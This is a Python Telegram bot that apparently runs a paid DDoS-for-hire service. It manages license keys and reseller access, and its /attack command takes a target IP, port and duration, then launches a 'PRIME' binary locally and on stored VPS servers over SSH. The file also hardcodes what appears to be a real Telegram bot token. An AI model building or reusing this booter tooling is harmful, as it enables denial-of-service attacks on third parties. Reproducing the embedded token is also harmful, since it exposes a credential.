import os, time, json, paramiko, random, string, threading, subprocess
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from telegram import Update
from datetime import datetime

# ==================== SECURE CONFIG ====================
# Railway Variables priority hain, warna ye default use honge
TELEGRAM_TOKEN = os.getenv("API_KEY", "8348509991:AAGY_0IqOJH8K2VZnWSQEF2VygFSAcS6ZN4") 
OWNER_ID = int(os.getenv("OWNER_ID", 2109683176)) 
# =======================================================

# Database initialization
FILES = ["vps.json", "users.json", "keys.json", "resellers.json"]
for f in FILES: 
    if not os.path.exists(f): 
        with open(f, 'w') as out: json.dump({} if "vps" not in f else [], out)

def load_data(file):
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return {}

def save_data(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=2)

BANNER = "⚔️ 𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 𝗠𝗔𝗦𝗧𝗘𝗥-𝗩𝟲 ⚔️"

# --- AUTH CHECK ---
def is_auth(uid):
    uid_str = str(uid)
    if uid == OWNER_ID: return True
    
    resellers = load_data("resellers.json")
    if uid_str in resellers: return True
    
    users = load_data("users.json")
    # Yahan Syntax Error fix kar diya gaya hai
    if uid_str in users and users[uid_str]['expiry'] > time.time():
        return True
    return False

# --- COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not is_auth(uid):
        await update.message.reply_text(f"❌ **ACCESS DENIED**\n\nID: `{uid}` is not authorized.\nContact @PRIME_X_ARMY", parse_mode="Markdown")
        return
    
    await update.message.reply_text(f"{BANNER}\n\n🚀 `/attack <ip> <port> <time>`\n🔑 `/redeem <key>`\n📊 `/status`", parse_mode="Markdown")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_auth(update.effective_user.id): return
    if len(context.args) < 3:
        await update.message.reply_text("💡 Usage: `/attack <ip> <port> <time>`")
        return
    
    ip, port, dur = context.args
    await update.message.reply_text(f"🚀 **ATTACK TRIGGERED**\n\n🎯 Target: `{ip}:{port}`\n⏳ Time: `{dur}s`", parse_mode="Markdown")
    
    # Local Railway Execution
    subprocess.Popen(f"./PRIME {ip} {port} {dur}", shell=True)
    
    # VPS Execution
    vps_servers = load_data("vps.json")
    for vps in vps_servers:
        threading.Thread(target=ssh_exec, args=(vps, ip, port, dur)).start()

def ssh_exec(vps, ip, port, dur):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps['ip'], username=vps['user'], password=vps['pass'], timeout=5)
        ssh.exec_command(f"chmod +x PRIME && nohup ./PRIME {ip} {port} {dur} > /dev/null 2>&1 &")
        ssh.close()
    except: pass

async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID: return
    days = int(context.args[0]) if context.args else 30
    key = f"PRIME-{''.join(random.choices(string.ascii_uppercase + string.digits, k=10))}"
    keys = load_data("keys.json")
    keys[key] = {"dur": days * 86400}
    save_data("keys.json", keys)
    await update.message.reply_text(f"✅ **KEY GENERATED**\n\n`{key}`\nValid: `{days} Days`", parse_mode="Markdown")

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    key = context.args[0].upper() if context.args else ""
    keys = load_data("keys.json")
    if key in keys:
        users = load_data("users.json")
        users[uid] = {"expiry": time.time() + keys[key]["dur"]}
        save_data("users.json", users)
        del keys[key]
        save_data("keys.json", keys)
        await update.message.reply_text("✅ **ACTIVATED!**")
    else:
        await update.message.reply_text("❌ **INVALID KEY**")

if __name__ == "__main__":
    if not TELEGRAM_TOKEN:
        print("❌ API_KEY Missing!")
    else:
        app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("attack", attack))
        app.add_handler(CommandHandler("gen", gen))
        app.add_handler(CommandHandler("redeem", redeem))
        print("🔥 PRIME-MASTER V6 LIVE")
        app.run_polling()
